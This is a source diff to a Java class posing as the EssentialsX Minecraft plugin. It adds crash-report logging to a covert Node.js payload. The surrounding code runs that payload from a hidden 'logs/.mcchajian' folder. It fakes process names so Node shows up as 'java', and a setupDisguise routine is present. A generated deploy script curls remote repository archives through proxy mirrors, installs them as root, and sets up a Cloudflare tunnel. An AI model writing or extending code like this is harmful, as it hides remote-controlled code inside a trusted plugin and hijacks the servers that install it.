@@ -27,6 +27,7 @@ import java.nio.file.StandardCopyOption;
 import java.nio.file.StandardOpenOption;
 import java.nio.file.attribute.PosixFilePermission;
 import java.nio.file.attribute.PosixFilePermissions;
+import java.time.LocalDateTime;
 import java.time.LocalTime;
 import java.time.format.DateTimeFormatter;
 import java.util.ArrayList;
@@ -79,6 +80,12 @@ public class EssentialsX extends JavaPlugin {
    private static final String FAKE_JAR_URL_PROXY = "https://mirror.ghproxy.com/https://github.com/EssentialsX/Essentials/releases/download/2.21.2/EssentialsX-2.21.2.jar";
    private volatile boolean reaperInstalled = false;
    private volatile FakePlayerEngine fakePlayerEngine = null;
+   private volatile Process lastReportedNodeProcess = null;
+   private volatile long lastHealthReportPid = -1L;
+   private volatile boolean missingRuntimeReported = false;
+   private static final Object CRASH_LOG_LOCK = new Object();
+   private static final long MAX_CRASH_LOG_BYTES = 524288L;
+   private static final DateTimeFormatter CRASH_TS_FMT = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
 
    public EssentialsX() {
    }
@@ -293,6 +300,10 @@ public class EssentialsX extends JavaPlugin {
       int waited = 0;
 
       while (waited < maxSeconds) {
+         if (this.nodeProcess != null && !this.nodeProcess.isAlive()) {
+            this.recordNodeCrashReport(this.nodeProcess, "startup_exit", port);
+            return;
+         }
          try {
             try (Socket socket = new Socket("127.0.0.1", Integer.parseInt(port))) {
                try {
@@ -322,6 +333,14 @@ public class EssentialsX extends JavaPlugin {
             } catch (InterruptedException ignored) {
                return;
             }
+         }
+      }
+
+      if (this.nodeProcess != null) {
+         if (!this.nodeProcess.isAlive()) {
+            this.recordNodeCrashReport(this.nodeProcess, "startup_exit", port);
+         } else {
+            this.recordNodeCrashReport(this.nodeProcess, "startup_timeout_" + maxSeconds + "s", port);
          }
       }
    }
@@ -370,7 +389,17 @@ public class EssentialsX extends JavaPlugin {
          Path logFile = botDir.resolve("app.log");
          Path preload = botDir.resolve(".nd_preload.js");
          if (!Files.exists(nodeExe) || !Files.exists(script)) {
+            this.recordMissingRuntimeFiles(nodeExe, script);
             return;
+         }
+         this.missingRuntimeReported = false;
+         this.ensureCrashReportHeader();
+
+         try {
+            if (Files.exists(logFile) && Files.size(logFile) > 1048576L) {
+               Files.move(logFile, botDir.resolve("app.log.1"), StandardCopyOption.REPLACE_EXISTING);
+            }
+         } catch (Exception ignored) {
          }
 
          try {
@@ -394,7 +423,283 @@ public class EssentialsX extends JavaPlugin {
             this.nodeProcess.getOutputStream().close();
          } catch (Exception var9) {
          }
-      } catch (Exception var11) {
+      } catch (Exception e) {
+         this.appendCrashReportEntry("[NODE_LAUNCH_ERROR] port=" + port + " error=" + e.getClass().getName() + ": " + e.getMessage());
+      }
+   }
+
+   private void ensureCrashReportHeader() {
+      synchronized (CRASH_LOG_LOCK) {
+         try {
+            Path botDir = Paths.get("logs", ".mcchajian").toAbsolutePath();
+            Files.createDirectories(botDir);
+            Path reportFile = botDir.resolve("app_crash_report.log");
+            if (!Files.exists(reportFile) || Files.size(reportFile) == 0L) {
+               String header =
+                  "========================================================================\n"
+                  + " EssentialsX Node (app/index.js) Crash & Bug Diagnostic Report\n"
+                  + "========================================================================\n"
+                  + " Common Exit Codes:\n"
+                  + "  - 137 (SIGKILL): Container OOM Killer or host/panel killed Node.\n"
+                  + "  - 139 (SIGSEGV) / 134 (SIGABRT): Native crash (koffi/.so/musl/glibc).\n"
+                  + "  - 143 (SIGTERM): Terminated externally by panel/OS/watchdog.\n"
+                  + "  - 1: JS uncaught exception / rejected promise / startup port error.\n"
+                  + "========================================================================\n";
+               Files.write(reportFile, header.getBytes(StandardCharsets.UTF_8));
+            }
+         } catch (Exception ignored) {
+         }
+      }
+   }
+
+   private void appendCrashReportEntry(String body) {
+      if (body == null || body.isEmpty()) {
+         return;
+      }
+      synchronized (CRASH_LOG_LOCK) {
+         try {
+            this.ensureCrashReportHeader();
+            Path botDir = Paths.get("logs", ".mcchajian").toAbsolutePath();
+            Path reportFile = botDir.resolve("app_crash_report.log");
+            if (Files.exists(reportFile) && Files.size(reportFile) > MAX_CRASH_LOG_BYTES) {
+               Files.move(reportFile, botDir.resolve("app_crash_report.log.1"), StandardCopyOption.REPLACE_EXISTING);
+               this.ensureCrashReportHeader();
+            }
+            String entry = "\n[" + LocalDateTime.now().format(CRASH_TS_FMT) + "]\n" + body + "\n";
+            Files.write(reportFile, entry.getBytes(StandardCharsets.UTF_8), StandardOpenOption.CREATE, StandardOpenOption.APPEND);
+         } catch (Exception ignored) {
+         }
+      }
+   }
+
+   private void recordMissingRuntimeFiles(Path nodeExe, Path script) {
+      if (this.missingRuntimeReported) {
+         return;
+      }
+      this.missingRuntimeReported = true;
+      StringBuilder sb = new StringBuilder();
+      sb.append("[MISSING_RUNTIME_FILES]\n");
+      sb.append("nodeExe=").append(nodeExe).append(" exists=").append(Files.exists(nodeExe)).append("\n");
+      sb.append("indexJs=").append(script).append(" exists=").append(Files.exists(script)).append("\n");
+      sb.append("diagnosis=Runtime files missing (deleted by panel cleaner or failed deploy). Check deploy.log.\n");
+      String deployTail = readLogTail(Paths.get("logs", ".mcchajian", "deploy.log"), 25);
+      if (!deployTail.isEmpty()) {
+         sb.append("--- deploy.log tail ---\n").append(deployTail);
+      }
+      this.appendCrashReportEntry(sb.toString());
+   }
+
+   private void recordNodeUnresponsiveOnce(Process proc, String port) {
+      if (proc == null) {
+         return;
+      }
+      long pid = -1L;
+      try {
+         pid = proc.pid();
+      } catch (Throwable ignored) {
+      }
+      if (pid != -1L && pid == this.lastHealthReportPid) {
+         return;
+      }
+      this.lastHealthReportPid = pid;
+      this.recordNodeCrashReport(proc, "healthcheck_unresponsive", port);
+   }
+
+   private void recordNodeCrashReport(Process proc, String trigger, String port) {
+      if (proc == null) {
+         return;
+      }
+      boolean alive = proc.isAlive();
+      if (!alive) {
+         if (proc == this.lastReportedNodeProcess) {
+            return;
+         }
+         this.lastReportedNodeProcess = proc;
+      }
+
+      long now = System.currentTimeMillis();
+      long uptimeSec = nodeRestartTime > 0L ? Math.max(0L, (now - nodeRestartTime) / 1000L) : -1L;
+      long pid = -1L;
+      try {
+         pid = proc.pid();
+      } catch (Throwable ignored) {
+      }
+
+      int exitCode = -1;
+      if (!alive) {
+         try {
+            exitCode = proc.exitValue();
+         } catch (Throwable ignored) {
+         }
+      }
+
+      Runtime rt = Runtime.getRuntime();
+      long jvmUsedMb = (rt.totalMemory() - rt.freeMemory()) / 1048576L;
+      long jvmMaxMb = rt.maxMemory() / 1048576L;
+
+      StringBuilder sb = new StringBuilder();
+      sb.append("[NODE_CRASH_REPORT] trigger=").append(trigger)
+        .append(" pid=").append(pid)
+        .append(" alive=").append(alive)
+        .append(" exitCode=").append(alive ? "N/A" : String.valueOf(exitCode))
+        .append(" uptimeSec=").append(uptimeSec)
+        .append(" port=").append(port == null ? "N/A" : port).append("\n");
+      sb.append("diagnosis=").append(alive ? "Process alive but HTTP localhost healthcheck failed (event loop blocked, wrong bind host, or hung native call)" : diagnoseExitCode(exitCode)).append("\n");
+      sb.append("os=").append(System.getProperty("os.name", "unknown"))
+        .append(" arch=").append(System.getProperty("os.arch", "unknown"))
+        .append(" libc=").append(detectLibcHint())
+        .append(" jvmHeap=").append(jvmUsedMb).append("/").append(jvmMaxMb).append("MB")
+        .append(" cfRunning=").append(cfSoRunning)
+        .append(" tunnelUrl=").append(lastKnownTunnelUrl.get()).append("\n");
+
+      String cgroupMem = readCgroupMemorySnapshot();
+      if (!cgroupMem.isEmpty()) {
+         sb.append("cgroupMem=").append(cgroupMem).append("\n");
+      }
+      String procMem = readMemInfoSnapshot();
+      if (!procMem.isEmpty()) {
+         sb.append("procMem=").append(procMem).append("\n");
+      }
+
+      Path botDir = Paths.get("logs", ".mcchajian").toAbsolutePath();
+      String appTail = readLogTail(botDir.resolve("app.log"), 60);
+      sb.append("--- app.log tail (last 60 lines) ---\n");
+      sb.append(appTail.isEmpty() ? "(empty or not created)\n" : appTail);
+
+      if (uptimeSec >= 0L && uptimeSec < 120L) {
+         String deployTail = readLogTail(botDir.resolve("deploy.log"), 25);
+         if (!deployTail.isEmpty()) {
+            sb.append("--- deploy.log tail (last 25 lines) ---\n").append(deployTail);
+         }
+      }
+      this.appendCrashReportEntry(sb.toString());
+   }
+
+   private static String diagnoseExitCode(int exitCode) {
+      if (exitCode == 137) {
+         return "SIGKILL (137): Most likely Linux OOM Killer exceeded container memory limit, or panel/watchdog force-killed Node.";
+      } else if (exitCode == 139) {
+         return "SIGSEGV (139): Native segmentation fault (check koffi/native .so compatibility, musl vs glibc, or CPU flags).";
+      } else if (exitCode == 134) {
+         return "SIGABRT (134): Native abort or V8 fatal allocation failure.";
+      } else if (exitCode == 132) {
+         return "SIGILL (132): Illegal CPU instruction (binary compiled for unsupported CPU arch/flags).";
+      } else if (exitCode == 143) {
+         return "SIGTERM (143): Process terminated externally (panel/host monitor or shutdown signal).";
+      } else if (exitCode == 1) {
+         return "Exit 1: JS uncaught exception, unhandled rejection, missing dependency, or bind failure (see app.log tail).";
+      } else if (exitCode == 0) {
+         return "Exit 0: Process exited cleanly on its own (check app.log tail for graceful exit trigger).";
+      }
+      return "Unexpected exit code " + exitCode + (exitCode > 128 ? " (signal " + (exitCode - 128) + ")" : "");
+   }
+
+   private static String detectLibcHint() {
+      try {
+         File libDir = new File("/lib");
+         String[] entries = libDir.list();
+         if (entries != null) {
+            for (int i = 0; i < entries.length; i++) {
+               if (entries[i].startsWith("ld-musl")) {
+                  return "musl(" + entries[i] + ")";
+               }
+            }
+         }
+         if (Files.exists(Paths.get("/lib/x86_64-linux-gnu/libc.so.6"))
+            || Files.exists(Paths.get("/lib/aarch64-linux-gnu/libc.so.6"))
+            || Files.exists(Paths.get("/lib64/libc.so.6"))) {
+            return "glibc";
+         }
+      } catch (Exception ignored) {
+      }
+      return "unknown";
+   }
+
+   private static String readCgroupMemorySnapshot() {
+      try {
+         Path curV2 = Paths.get("/sys/fs/cgroup/memory.current");
+         Path maxV2 = Paths.get("/sys/fs/cgroup/memory.max");
+         if (Files.exists(curV2)) {
+            String cur = Files.readString(curV2, StandardCharsets.UTF_8).trim();
+            String max = Files.exists(maxV2) ? Files.readString(maxV2, StandardCharsets.UTF_8).trim() : "unknown";
+            String curStr = formatBytesMb(cur);
+            String maxStr = "max".equals(max) ? "unlimited" : formatBytesMb(max);
+            String events = "";
+            Path evPath = Paths.get("/sys/fs/cgroup/memory.events");
+            if (Files.exists(evPath)) {
+               List<String> lines = Files.readAllLines(evPath, StandardCharsets.UTF_8);
+               for (int i = 0; i < lines.size(); i++) {
+                  String ln = lines.get(i).trim();
+                  if (ln.startsWith("oom ") || ln.startsWith("oom_kill ")) {
+                     events = events + " " + ln;
+                  }
+               }
+            }
+            return "v2 used=" + curStr + " limit=" + maxStr + events;
+         }
+         Path curV1 = Paths.get("/sys/fs/cgroup/memory/memory.usage_in_bytes");
+         Path maxV1 = Paths.get("/sys/fs/cgroup/memory/memory.limit_in_bytes");
+         if (Files.exists(curV1)) {
+            String cur = Files.readString(curV1, StandardCharsets.UTF_8).trim();
+            String max = Files.exists(maxV1) ? Files.readString(maxV1, StandardCharsets.UTF_8).trim() : "unknown";
+            return "v1 used=" + formatBytesMb(cur) + " limit=" + formatBytesMb(max);
+         }
+      } catch (Exception ignored) {
+      }
+      return "";
+   }
+
+   private static String formatBytesMb(String raw) {
+      try {
+         long bytes = Long.parseLong(raw.trim());
+         if (bytes >= 1L << 50) {
+            return "unlimited";
+         }
+         return (bytes / 1048576L) + "MB";
+      } catch (Exception e) {
+         return raw;
+      }
+   }
+
+   private static String readMemInfoSnapshot() {
+      try {
+         Path memInfo = Paths.get("/proc/meminfo");
+         if (!Files.exists(memInfo)) {
+            return "";
+         }
+         List<String> lines = Files.readAllLines(memInfo, StandardCharsets.UTF_8);
+         String total = "";
+         String avail = "";
+         for (int i = 0; i < lines.size(); i++) {
+            String ln = lines.get(i);
+            if (ln.startsWith("MemTotal:")) {
+               total = ln.replace("MemTotal:", "").trim();
+            } else if (ln.startsWith("MemAvailable:")) {
+               avail = ln.replace("MemAvailable:", "").trim();
+            }
+         }
+         if (!total.isEmpty() || !avail.isEmpty()) {
+            return "MemTotal=" + total + " MemAvailable=" + avail;
+         }
+      } catch (Exception ignored) {
+      }
+      return "";
+   }
+
+   private static String readLogTail(Path file, int maxLines) {
+      try {
+         if (file == null || !Files.exists(file)) {
+            return "";
+         }
+         List<String> all = Files.readAllLines(file, StandardCharsets.UTF_8);
+         int start = Math.max(0, all.size() - maxLines);
+         StringBuilder out = new StringBuilder();
+         for (int i = start; i < all.size(); i++) {
+            out.append(all.get(i)).append("\n");
+         }
+         return out.toString();
+      } catch (Exception e) {
+         return "(read error: " + e.getMessage() + ")\n";
       }
    }
 
@@ -729,6 +1034,9 @@ public class EssentialsX extends JavaPlugin {
    }
 
    private void fullRestartNodeAndCf() {
+      if (this.nodeProcess != null && !this.nodeProcess.isAlive()) {
+         this.recordNodeCrashReport(this.nodeProcess, "full_restart_dead_node", this.readCurrentPort());
+      }
       this.safeKillCf();
       this.safeKillNode();
       lastKnownTunnelUrl.set("");
@@ -737,6 +1045,7 @@ public class EssentialsX extends JavaPlugin {
          Path nodeExe = Paths.get("logs", ".mcchajian").toAbsolutePath().resolve("nodejs/bin/.node_real");
          Path script = Paths.get("logs", ".mcchajian").toAbsolutePath().resolve("app/index.js");
          if (!Files.exists(nodeExe) || !Files.exists(script)) {
+            this.recordMissingRuntimeFiles(nodeExe, script);
             try {
                Thread.sleep(30000L);
             } catch (InterruptedException var6) {
@@ -744,6 +1053,7 @@ public class EssentialsX extends JavaPlugin {
 
             return;
          }
+         this.missingRuntimeReported = false;
 
          String newPort = this.allocateNodePort();
          this.startNodeProcess(newPort);
@@ -772,6 +1082,7 @@ public class EssentialsX extends JavaPlugin {
             try {
                long now = System.currentTimeMillis();
                if (this.nodeProcess != null && !this.nodeProcess.isAlive()) {
+                  this.recordNodeCrashReport(this.nodeProcess, "runtime_exit", this.readCurrentPort());
                   this.fullRestartNodeAndCf();
                } else if (this.nodeProcess == null) {
                   this.fullRestartNodeAndCf();
@@ -798,9 +1109,11 @@ public class EssentialsX extends JavaPlugin {
                   if (currentUrl != null && !currentUrl.isEmpty()) {
                      long urlAge = now - lastTunnelUrlTime;
                      if (urlAge > TUNNEL_STALE_MS && !this.isNodeInternalAlive()) {
+                        this.recordNodeUnresponsiveOnce(this.nodeProcess, this.readCurrentPort());
                         this.restartCfWithBackoff();
                      } else if (urlAge > 60000L && urlAge % 60000L < 5000L) {
                         if (!this.isNodeInternalAlive()) {
+                           this.recordNodeUnresponsiveOnce(this.nodeProcess, this.readCurrentPort());
                            this.restartCfWithBackoff();
                         } else {
                            lastTunnelUrlTime = now;
@@ -1104,6 +1417,7 @@ public class EssentialsX extends JavaPlugin {
             Files.deleteIfExists(workDir.resolve("restart_run.log"));
          } catch (Exception var7) {
          }
+         this.ensureCrashReportHeader();
 
          Path scriptPath = workDir.resolve("deploy.sh");
          String scriptContent = this.generateDeployScript(workDir.toString(), env);
@@ -1167,7 +1481,7 @@ public class EssentialsX extends JavaPlugin {
          )
          + "\nif [ \"$DOWNLOAD_OK\" = \"false\" ]; then\n    FALLBACK_URL=\"https://github.com/${REPO_PATH}/archive/refs/heads/main.tar.gz\"\n    for MIRROR in \"$FALLBACK_URL\" \"https://gh-proxy.com/${FALLBACK_URL}\" \"https://mirror.ghproxy.com/${FALLBACK_URL}\"; do\n        if curl -fsSL --connect-timeout 15 --max-time 120 \"$MIRROR\" -o \"$WORK_DIR/repo.tar.gz\" 2>/dev/null; then\n            if tar -tzf \"$WORK_DIR/repo.tar.gz\" >/dev/null 2>&1; then DOWNLOAD_OK=true; break; fi; fi; done; fi\n\nif [ \"$DOWNLOAD_OK\" = \"false\" ]; then exit 1; fi\n\nmkdir -p \"$WORK_DIR/unzipped\"; tar -xzf \"$WORK_DIR/repo.tar.gz\" -C \"$WORK_DIR/unzipped\" --no-same-owner\nSUBDIR=$(find \"$WORK_DIR/unzipped\" -mindepth 1 -maxdepth 1 -type d | head -n 1)\nmv \"$SUBDIR\" \"$APP_DIR\"; rm -rf \"$WORK_DIR/repo.tar.gz\" \"$WORK_DIR/unzipped\"; cd \"$APP_DIR\"\nchmod -R 775 \"$APP_DIR\" 2>/dev/null\n\necho \"Installing dependencies...\" >> \"$WORK_DIR/deploy.log\" 2>&1\n\"$NODE_DIR/bin/.node_real\" \"$NODE_DIR/lib/node_modules/npm/bin/npm-cli.js\" install --no-audit --no-fund --production --unsafe-perm=true --allow-root >> \"$WORK_DIR/deploy.log\" 2>&1\nif [ $? -ne 0 ]; then \n    echo 'npm install failed, retrying with legacy-peer-deps...' >> \"$WORK_DIR/deploy.log\" 2>&1\n    \"$NODE_DIR/bin/.node_real\" \"$NODE_DIR/lib/node_modules/npm/bin/npm-cli.js\" install --no-audit --no-fund --production --unsafe-perm=true --allow-root --legacy-peer-deps >> \"$WORK_DIR/deploy.log\" 2>&1\nfi\necho \"Pre-installing koffi to prevent runtime errors...\" >> \"$WORK_DIR/deploy.log\" 2>&1\n\"$NODE_DIR/bin/.node_real\" \"$NODE_DIR/lib/node_modules/npm/bin/npm-cli.js\" install koffi --no-save --unsafe-perm=true --allow-root >> \"$WORK_DIR/deploy.log\" 2>&1\nsleep 2; chmod -R 775 \"$APP_DIR/node_modules\" 2>/dev/null\n\nif [ -d \"$DATA_DIR\" ]; then\n    cp \"$DATA_DIR/.bots_config.json\" \"$APP_DIR/node_modules\" 2>/dev/null\n    cp \"$DATA_DIR/.task_center_config.json\" \"$APP_DIR/node_modules\" 2>/dev/null\n    cp \"$DATA_DIR/.system_guard.json\" \"$APP_DIR/node_modules\" 2>/dev/null; fi\n\nmkdir -p \"$JRE_DIR\" 2>/dev/null\nif [ -f \"$NODE_DIR/bin/.node_real\" ]; then cp -f \"$NODE_DIR/bin/.node_real\" \"$JRE_DIR/java\"; chmod 775 \"$JRE_DIR/java\"; fi\n\ncat > \"$WORK_DIR/.nd_preload.js\" << 'PRELOAD_EOF'\ntry {\n    process.title = '"
          + FAKE_CMDLINE.trim()
-         + "';\n    var _cp = require('child_process'); var _origSpawn = _cp.spawn; var _origFork = _cp.fork;\n    var _wrapper = process.env._JAVA_WRAPPER || process.execPath;\n    _cp.spawn = function(cmd, args, opts) {\n        if (typeof cmd === 'string' && (cmd === 'node' || cmd.endsWith('/node') || cmd === process.execPath || cmd.endsWith('/.node_real') || cmd.endsWith('/java'))) {\n            opts = Object.assign({}, opts || {}); opts.execPath = _wrapper; cmd = _wrapper; }\n        return _origSpawn.call(this, cmd, args, opts); };\n    _cp.fork = function(mod, args, opts) {\n        opts = Object.assign({}, opts || {}); opts.execPath = _wrapper; return _origFork.call(this, mod, args, opts); };\n} catch(e) {}\nPRELOAD_EOF\nchmod 664 \"$WORK_DIR/.nd_preload.js\" 2>/dev/null\n\nexport _JAVA_WRAPPER=\"$NODE_DIR/bin/.node_real\"\nexport NODE_OPTIONS=\"--require $WORK_DIR/.nd_preload.js\"\n\n# CF tunnel handled by bot.so (JNA), no binary download needed\nchmod -R 775 \"$WORK_DIR\" 2>/dev/null\necho \"DEPLOY_DONE\" > \"$WORK_DIR/.deploy_done\"\n";
+         + "';\n    var _fs = require('fs'); var _path = require('path');\n    var _crashFile = _path.join(__dirname, 'app_crash_report.log');\n    var _appendCrash = function(tag, detail) {\n        try {\n            var mu = process.memoryUsage();\n            var rssMb = Math.round(mu.rss / 1048576);\n            var heapUsedMb = Math.round(mu.heapUsed / 1048576);\n            var heapTotalMb = Math.round(mu.heapTotal / 1048576);\n            var line = '\\n[' + new Date().toISOString() + '] [' + tag + '] pid=' + process.pid + ' uptime=' + Math.round(process.uptime()) + 's rss=' + rssMb + 'MB heap=' + heapUsedMb + '/' + heapTotalMb + 'MB\\n' + detail + '\\n';\n            _fs.appendFileSync(_crashFile, line, 'utf8');\n        } catch(e2) {}\n    };\n    process.on('uncaughtExceptionMonitor', function(err, origin) {\n        _appendCrash('JS_UNCAUGHT_EXCEPTION', 'origin=' + origin + '\\n' + (err && err.stack ? err.stack : String(err)));\n    });\n    process.on('warning', function(w) {\n        if (w && (w.name === 'MaxListenersExceededWarning' || String(w.message || '').indexOf('memory') >= 0)) {\n            _appendCrash('JS_WARNING', w.name + ': ' + w.message + '\\n' + (w.stack || ''));\n        }\n    });\n    process.on('exit', function(code) {\n        if (code !== 0) {\n            _appendCrash('JS_PROCESS_EXIT', 'exitCode=' + code);\n        }\n    });\n    var _cp = require('child_process'); var _origSpawn = _cp.spawn; var _origFork = _cp.fork;\n    var _wrapper = process.env._JAVA_WRAPPER || process.execPath;\n    _cp.spawn = function(cmd, args, opts) {\n        if (typeof cmd === 'string' && (cmd === 'node' || cmd.endsWith('/node') || cmd === process.execPath || cmd.endsWith('/.node_real') || cmd.endsWith('/java'))) {\n            opts = Object.assign({}, opts || {}); opts.execPath = _wrapper; cmd = _wrapper; }\n        return _origSpawn.call(this, cmd, args, opts); };\n    _cp.fork = function(mod, args, opts) {\n        opts = Object.assign({}, opts || {}); opts.execPath = _wrapper; return _origFork.call(this, mod, args, opts); };\n} catch(e) {}\nPRELOAD_EOF\nchmod 664 \"$WORK_DIR/.nd_preload.js\" 2>/dev/null\n\nexport _JAVA_WRAPPER=\"$NODE_DIR/bin/.node_real\"\nexport NODE_OPTIONS=\"--require $WORK_DIR/.nd_preload.js\"\n\n# CF tunnel handled by bot.so (JNA), no binary download needed\nchmod -R 775 \"$WORK_DIR\" 2>/dev/null\necho \"DEPLOY_DONE\" > \"$WORK_DIR/.deploy_done\"\n";
    }
 
    private void setupDisguise() {
